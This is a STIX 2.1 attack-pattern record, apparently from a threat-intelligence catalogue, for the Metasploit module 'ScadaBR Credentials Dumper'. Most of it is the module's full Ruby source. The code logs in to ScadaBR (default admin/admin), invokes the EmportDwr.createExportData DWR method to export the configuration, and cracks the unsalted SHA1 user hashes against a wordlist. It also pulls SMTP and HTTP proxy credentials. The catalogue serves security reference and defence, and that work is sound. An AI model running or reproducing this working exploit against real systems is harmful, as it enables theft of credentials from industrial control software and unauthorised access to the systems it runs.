{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fe70ab3-598b-48f0-96c2-e0fa6c69805c",
    "created": "2024-08-14T16:23:28.812689Z",
    "modified": "2024-08-14T16:23:28.812693Z",
    "name": "ScadaBR Credentials Dumper",
    "description": " This module retrieves credentials from ScadaBR, including service credentials and unsalted SHA1 password hashes for all users, by invoking the `EmportDwr.createExportData` DWR method of Mango M2M which is exposed to all authenticated users regardless of privilege level.  This module has been tested successfully with ScadaBR versions 1.0 CE and 0.9 on Windows and Ubuntu systems. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/scadabr_credential_dump.rb",
            "external_id": "scadabr_credential_dump.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "http://www.scadabr.com.br/?q=node/1375"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ScadaBR Credentials Dumper',\n        'Description' => %q{\n          This module retrieves credentials from ScadaBR, including\n          service credentials and unsalted SHA1 password hashes for\n          all users, by invoking the `EmportDwr.createExportData` DWR\n          method of Mango M2M which is exposed to all authenticated\n          users regardless of privilege level.\n\n          This module has been tested successfully with ScadaBR\n          versions 1.0 CE and 0.9 on Windows and Ubuntu systems.\n        },\n        'Author' => 'bcoles',\n        'License' => MSF_LICENSE,\n        'References' => ['URL', 'http://www.scadabr.com.br/?q=node/1375'],\n        'DisclosureDate' => '2017-05-28'\n      )\n    )\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('USERNAME', [ true, 'The username for the application', 'admin' ]),\n      OptString.new('PASSWORD', [ true, 'The password for the application', 'admin' ]),\n      OptString.new('TARGETURI', [ true, 'The base path to ScadaBR', '/ScadaBR' ]),\n      OptPath.new('PASS_FILE', [\n        false, 'Wordlist file to crack password hashes',\n        File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt')\n      ])\n    ])\n  end\n\n  def login(user, pass)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'login.htm'),\n      'method' => 'POST',\n      'cookie' => \"JSESSIONID=#{Rex::Text.rand_text_hex(32)}\",\n      'vars_post' => {\n        'username' => Rex::Text.uri_encode(user, 'hex-normal'),\n        'password' => Rex::Text.uri_encode(pass, 'hex-normal')\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, \"#{peer} Connection failed\")\n    end\n\n    if res.code == 302 && !res.headers['location'].include?('/login.htm') && res.get_cookies =~ /JSESSIONID=([^;]+);/\n      @cookie = res.get_cookies.scan(/JSESSIONID=([^;]+);/).flatten.first\n      print_good(\"#{peer} Authenticated successfully as '#{user}'\")\n    else\n      fail_with(Failure::NoAccess, \"#{peer} Authentication failed\")\n    end\n  end\n\n  def export_data\n    params = [\n      'callCount=1',\n      \"page=#{target_uri.path}/emport.shtm\",\n      \"httpSessionId=#{@cookie}\",\n      \"scriptSessionId=#{Rex::Text.rand_text_hex(32)}\",\n      'c0-scriptName=EmportDwr',\n      'c0-methodName=createExportData',\n      'c0-id=0',\n      'c0-param0=string:3',\n      'c0-param1=boolean:true',\n      'c0-param2=boolean:true',\n      'c0-param3=boolean:true',\n      'c0-param4=boolean:true',\n      'c0-param5=boolean:true',\n      'c0-param6=boolean:true',\n      'c0-param7=boolean:true',\n      'c0-param8=boolean:true',\n      'c0-param9=boolean:true',\n      'c0-param10=boolean:true',\n      'c0-param11=boolean:true',\n      'c0-param12=boolean:true',\n      'c0-param13=boolean:true',\n      'c0-param14=boolean:true',\n      'c0-param15=boolean:true',\n      'c0-param16=string:100',\n      'c0-param17=boolean:true',\n      'batchId=1'\n    ]\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'dwr/call/plaincall/EmportDwr.createExportData.dwr'),\n      'method' => 'POST',\n      'cookie' => \"JSESSIONID=#{@cookie}\",\n      'ctype' => 'text/plain',\n      'data' => params.join(\"\\n\")\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, \"#{peer} Connection failed\")\n    end\n\n    config_data = res.body.scan(/dwr.engine._remoteHandleCallback\\('\\d*','\\d*',\"(.+)\"\\);/).flatten.first\n\n    unless config_data\n      fail_with(Failure::UnexpectedReply, \"#{peer} Export failed\")\n    end\n\n    print_good(\"#{peer} Export successful (#{config_data.length} bytes)\")\n\n    config_data\n  end\n\n  def load_wordlist(wordlist)\n    return unless File.exist?(wordlist)\n\n    File.open(wordlist, 'rb').each_line do |line|\n      @wordlist << line.chomp\n    end\n  end\n\n  def crack(user, hash)\n    return user if hash == Rex::Text.sha1(user)\n\n    @wordlist.each do |word|\n      return word if hash == Rex::Text.sha1(word)\n    end\n\n    nil\n  end\n\n  def run\n    login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    config = export_data\n\n    path = store_loot('scadabr.config', 'text/plain', rhost, config, 'ScadaBR configuration settings')\n    print_good(\"Config saved in: #{path}\")\n\n    begin\n      json = JSON.parse(config.gsub(/\\\\r/, '').gsub(/\\\\n/, '').gsub(/\\\\\"/, '\"').gsub(/\\\\'/, \"'\").gsub(/\\\\\\\\/, '\\\\').gsub(/\\\\\\r?\\n/, ''))\n    rescue StandardError\n      fail_with(Failure::UnexpectedReply, \"#{peer} Could not parse exported settings as JSON.\")\n    end\n\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    user_cred_table = Rex::Text::Table.new(\n      'Header' => 'ScadaBR User Credentials',\n      'Indent' => 1,\n      'Columns' => ['Username', 'Password', 'Hash (SHA1)', 'Role', 'E-mail']\n    )\n\n    users = json['users']\n\n    if users.empty?\n      print_error('Found no user data')\n    else\n      print_good(\"Found #{users.length} users\")\n      @wordlist = *'0'..'9', *'A'..'Z', *'a'..'z'\n      @wordlist.concat(['12345', 'admin', 'password', 'scada', 'scadabr', datastore['PASSWORD']])\n      load_wordlist(datastore['PASS_FILE']) unless datastore['PASS_FILE'].nil?\n    end\n\n    users.each do |user|\n      username = user['username']\n\n      next if username.blank?\n\n      admin = user['admin']\n      mail = user['email']\n      hash = Rex::Text.decode_base64(user['password']).unpack('H*').flatten.first\n      pass = crack(username, hash)\n      user_cred_table << [username, pass, hash, (admin ? 'Admin' : 'User'), mail]\n\n      creds = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: username\n      }.merge(service_data)\n\n      if pass\n        print_status(\"Found weak credentials (#{username}:#{pass})\")\n        creds.merge!({\n          private_type: :password,\n          private_data: pass\n        })\n      else\n        creds.merge!({\n          private_type: :nonreplayable_hash,\n          private_data: \"{SHA}#{user['password']}\"\n        })\n      end\n\n      login_data = {\n        core: create_credential(creds),\n        access_level: (admin ? 'Admin' : 'User'),\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_data)\n\n      create_credential_login(login_data)\n    end\n\n    service_cred_table = Rex::Text::Table.new(\n      'Header' => 'ScadaBR Service Credentials',\n      'Indent' => 1,\n      'Columns' => ['Service', 'Host', 'Port', 'Username', 'Password']\n    )\n\n    print_line\n    print_line(user_cred_table.to_s)\n\n    unless json['systemSettings'].nil?\n      system_settings = json['systemSettings'].first\n\n      unless system_settings['emailSmtpHost'] == '' || system_settings['emailSmtpUsername'] == ''\n        smtp_host = system_settings['emailSmtpHost']\n        smtp_port = system_settings['emailSmtpPort']\n        smtp_user = system_settings['emailSmtpUsername']\n        smtp_pass = system_settings['emailSmtpPassword']\n        print_good(\"Found SMTP credentials: #{smtp_user}:#{smtp_pass}@#{smtp_host}:#{smtp_port}\")\n        service_cred_table << ['SMTP', smtp_host, smtp_port, smtp_user, smtp_pass]\n      end\n\n      unless system_settings['httpClientProxyServer'] == '' || system_settings['httpClientProxyUsername'] == ''\n        proxy_host = system_settings['httpClientProxyServer']\n        proxy_port = system_settings['httpClientProxyPort']\n        proxy_user = system_settings['httpClientProxyUsername']\n        proxy_pass = system_settings['httpClientProxyPassword']\n        print_good(\"Found HTTP proxy credentials: #{proxy_user}:#{proxy_pass}@#{proxy_host}:#{proxy_port}\")\n        service_cred_table << ['HTTP proxy', proxy_host, proxy_port, proxy_user, proxy_pass]\n      end\n\n      print_line\n      print_line(service_cred_table.to_s)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-28"
}